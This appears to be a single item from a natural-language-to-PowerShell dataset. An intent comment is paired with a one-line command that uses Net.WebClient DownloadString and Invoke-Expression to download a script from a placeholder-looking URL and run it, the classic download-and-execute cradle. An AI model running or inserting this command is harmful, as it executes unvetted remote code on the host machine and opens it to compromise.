# Natural language intent:
# Downloads and executes a PowerShell script from a specified URL using Invoke-Expression.

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://heavy.site.com/heavy_code.ps1')"
